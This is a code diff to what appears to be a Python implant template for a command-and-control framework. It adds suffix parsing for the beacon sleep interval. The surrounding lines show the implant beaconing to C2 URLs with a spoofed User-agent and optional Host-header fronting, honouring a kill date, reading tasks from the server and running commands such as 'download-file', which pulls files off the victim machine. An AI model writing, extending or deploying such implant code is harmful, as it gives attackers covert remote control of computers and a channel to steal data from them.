@@ -1,6 +1,15 @@
 import urllib2, os, subprocess, re, datetime, time, base64, string, random
+
+def parse_sleep_time(sleep):
+  if sleep.endswith('s'):
+    return int(sleep.strip('s').strip())
+  elif sleep.endswith('m'):
+    return int(sleep.strip('m').strip()) * 60
+  elif sleep.endswith('h'):
+    return int(sleep.strip('h').strip()) * 60 * 60
+
 hh = '%s'
-timer = %s
+timer = parse_sleep_time("%s".strip())
 icoimage = [%s]
 urls = [%s]
 kd=time.strptime("%s","%%d/%%m/%%Y")
@@ -91,7 +100,7 @@ while(True):
       ua='%s'
       if hh: req=urllib2.Request(server,headers={'Host':hh,'User-agent':ua})
       else: req=urllib2.Request(server,headers={'User-agent':ua})
-      res=urllib2.urlopen(req);
+      res=urllib2.urlopen(req)
       html = res.read()
     except Exception as e:
       E = e
@@ -112,7 +121,8 @@ while(True):
             taskId = split[:5].strip().strip('\x00')
             cmd = split[5:].strip().strip('\x00')
             if cmd[:10] == "$sleeptime":
-              timer = int(cmd.replace("$sleeptime = ",""))
+              sleep = cmd.replace("$sleeptime = ","").strip()
+              timer = parse_sleep_time(sleep)
             elif cmd[:13] == "download-file":
               fname = cmd.replace("download-file ","")
               returnval = dfile(fname)
